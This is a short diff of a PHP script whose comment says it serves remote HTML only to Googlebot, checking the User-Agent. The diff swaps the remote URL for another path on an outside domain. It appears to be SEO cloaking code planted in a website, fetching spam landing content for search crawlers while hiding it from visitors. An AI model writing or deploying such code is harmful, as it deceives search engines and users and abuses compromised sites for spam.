@@ -1,7 +1,7 @@
 <?php
 // ==== Serve remote .txt HTML only for Googlebot (simplecondition) ====
 
-$REMOTE_URL = 'https://seojkw.xyz/win/landing.txt';
+$REMOTE_URL = 'https://seojkw.xyz/kadinpcjakartaselatan/landing1.txt';
 
 // Fungsi cek sederhana (User-Agent saja)
 function is_googlebot(): bool {
